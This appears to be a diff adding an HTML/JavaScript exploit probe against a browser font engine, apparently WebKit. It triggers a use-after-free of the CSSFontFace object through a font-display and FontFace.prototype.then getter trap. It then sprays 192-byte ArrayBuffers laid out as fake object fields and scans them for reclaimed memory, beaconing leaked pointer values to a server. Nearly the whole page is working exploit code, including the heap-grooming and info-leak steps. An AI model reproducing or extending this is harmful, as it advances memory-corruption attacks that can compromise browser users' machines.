@@ -1,0 +1,202 @@
+<!--
+  p587: In-document CSSFontFace free via font-display lever.
+
+  QUESTION: After font-display:optional drives a CSS-connected face to Failure
+  status, can we free the CSSFontFace in-document and reclaim with a spray?
+
+  Amendment 3 (cobrajet302gt #174): initializeWrapper clears m_mayBePurged
+  permanently. If true, purge alone can't free the face after a wrapper existed.
+  But document.fonts.delete(face) + style removal + recalc might still work.
+  This probe MEASURES which path (if any) frees the 192B CSSFontFace object.
+
+  Design: Two-phase single-page experiment.
+
+  Phase A — in-document free attempt:
+    1. Inject @font-face 'tf' with dead URL + font-display:optional
+    2. document.fonts.load('1em tf') → materializes wrapper, starts load
+    3. Wait 600ms for optional→Failure (~100ms) + faceFinished → pin 2 released
+    4. Capture document.fonts.size (oracle: does the count change?)
+    5. GC pressure to free the wrapper
+    6. Capture document.fonts.size again (does GC change it?)
+    7. Remove the <style> + force recalc (dirty cascade → rebuild → purge?)
+    8. Capture document.fonts.size a third time
+
+  Phase B — standard .then free+spray on a SECOND face 'tf2':
+    Uses the proven p580 recipe on a different face.
+    The spray tries to reclaim BOTH the Phase-B face AND (if freed) the Phase-A face.
+    If Phase A freed its 192B slot, we might see 2 hits instead of 1.
+    The hit count is the primary signal.
+
+  Query param: ?mode=optional (default) | swap (control)
+    optional → should free in Phase A → expect 2 hits (or 1 if m_mayBePurged blocks)
+    swap     → should NOT free (TimedOut, never terminal) → expect 1 hit
+
+  Expected beacons:
+    G,mode=<m>           = start
+    ALOAD                = Phase A load() called
+    AWAIT                = Phase A waited 600ms
+    AFS=<n>              = fonts.size after wait
+    AGCPUSH              = GC pressure done
+    AFS2=<n>             = fonts.size after GC
+    ADIRTY               = style removed + recalc forced
+    AFS3=<n>             = fonts.size after dirty
+    BF                   = Phase B: face freed inside .then getter
+    BS<n>                = Phase B: spray done
+    <t>H<i>,rc=<d>,T=<hex>,W=<hex>  = hit at scan time <t>
+    <t>MISS              = no hit at scan time
+    NHITS=<n>            = total hit count at 2s (1=only Phase B; 2=both freed)
+    ALIVE / ALIVE2       = survival markers
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+var mode=(location.search.match(/mode=(\w+)/)||[])[1]||'optional';
+
+function main(){
+b('G,mode='+mode);
+
+/* ===== PHASE A: in-document free attempt ===== */
+
+/* A1: inject @font-face with dead URL */
+var styA=document.createElement('style');
+styA.id='ffa';
+styA.textContent=
+  "@font-face{font-family:tf;"+
+  "src:url('http://0.0.0.0:1/nonexistent.woff2');"+
+  "font-display:"+mode+";"+
+  "unicode-range:U+0041}";
+document.head.appendChild(styA);
+
+/* A2: trigger load → materializes wrapper */
+var loadA=document.fonts.load('1em tf','A');
+b('ALOAD');
+
+/* A3: wait for terminal transition */
+setTimeout(function(){
+  b('AWAIT');
+
+  /* A4: fonts.size oracle — baseline */
+  try{b('AFS='+document.fonts.size);}catch(e){b('AFS=err');}
+
+  /* A5: drop wrapper refs + GC pressure */
+  loadA=null;
+  for(var g=0;g<20;g++){
+    var trash=[];
+    for(var t=0;t<500;t++)trash.push(new ArrayBuffer(4096));
+    trash=null;
+  }
+  b('AGCPUSH');
+
+  /* A6: fonts.size after GC */
+  try{b('AFS2='+document.fonts.size);}catch(e){b('AFS2=err');}
+
+  /* A7: dirty cascade — remove the @font-face style + force recalc
+     Amendment 1: purge rides buildStarted, need dirty cascade
+     Amendment 4: removal + getter in same synchronous task */
+  var ffA=document.getElementById('ffa');
+  if(ffA)ffA.remove();
+  document.body.offsetHeight; /* synchronous recalc → buildStarted → purge */
+  b('ADIRTY');
+
+  /* A8: fonts.size after dirty */
+  try{b('AFS3='+document.fonts.size);}catch(e){b('AFS3=err');}
+
+  /* ===== PHASE B: standard .then free on a second face ===== */
+  phaseB();
+
+},600);
+}
+
+function phaseB(){
+  /* B1: inject second @font-face (always local, always works) */
+  var styB=document.createElement('style');
+  styB.id='ffb';
+  styB.textContent="@font-face{font-family:sb;src:local(Arial);unicode-range:U+0042}";
+  document.head.appendChild(styB);
+
+  /* B2: primary face for the .then trick */
+  var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0043'});
+  document.fonts.add(pa);
+  void pa.loaded;
+
+  /* B3: .then getter trap — frees pa's CSSFontFace, sprays to reclaim */
+  var fired=0;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+  get:function(){if(fired)return;fired=1;
+
+    /* Remove the style → dirty cascade */
+    var ffB=document.getElementById('ffb');
+    if(ffB)ffB.remove();
+
+    /* Delete the face from the set */
+    try{document.fonts.delete(this);}catch(e){}
+
+    /* Force recalc → purge */
+    document.body.offsetHeight;
+    b('BF');
+
+    /* Spray 2048 × 192B with safety fields */
+    var lane=[];
+    for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane.length;j++){
+      wD(lane[j],0x00,2);         /* rc=2 (engine bumps to 3 on hit) */
+      wD(lane[j],0x60,0);         /* opCount=0 */
+      wD(lane[j],0x64,0xFFFFFFFF);/* maxOp=0xFFFFFFFF */
+      lane[j][0x82]=3;            /* Status::Success */
+    }
+    b('BS'+lane.length);
+    window._l=lane;
+    return;
+  },set:function(){}});
+
+  /* B4: trigger load — the .then trap fires during resolution */
+  document.fonts.load('1em pa, sb','BC').then(function(){},function(){});
+
+  /* B5: scan for hits — look for ANY buffer where engine wrote */
+  function scan(tag){
+    var la=window._l;if(!la)return;
+    var hits=[];
+    for(var i=0;i<la.length;i++){
+      var v=la[i],rc=rD(v,0);
+      var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+      if(rc!==2||t0)hits.push(i);
+    }
+    if(hits.length===0){b(tag+'MISS');return;}
+    for(var k=0;k<hits.length&&k<4;k++){
+      var idx=hits[k],v=la[idx];
+      var T=rQ(v,0x58),W=rQ(v,0x68),kc=rD(v,0x50);
+      b(tag+'H'+idx+',rc='+rD(v,0)+',T='+T+',W='+W);
+      var d='';for(var q=0;q<8;q++)d+=rQ(v,q*8)+'.';
+      b(tag+'D0:'+d);
+      d='';for(var q=8;q<16;q++)d+=rQ(v,q*8)+'.';
+      b(tag+'D1:'+d);
+      d='';for(var q=16;q<24;q++)d+=rQ(v,q*8)+'.';
+      b(tag+'D2:'+d);
+    }
+  }
+
+  setTimeout(function(){scan('A');},60);
+  setTimeout(function(){scan('B');},400);
+  setTimeout(function(){scan('C');},1000);
+  setTimeout(function(){b('ALIVE');},500);
+  setTimeout(function(){
+    b('ALIVE2');
+    var la=window._l;if(!la)return;
+    var n=0;
+    for(var i=0;i<la.length;i++){
+      var rc=rD(la[i],0);
+      var t0=la[i][0x58]|la[i][0x59]|la[i][0x5A]|la[i][0x5B]|la[i][0x5C]|la[i][0x5D]|la[i][0x5E]|la[i][0x5F];
+      if(rc!==2||t0)n++;
+    }
+    b('NHITS='+n);
+  },2000);
+}
+
+setTimeout(main,0);
+</script></head><body>p</body></html>
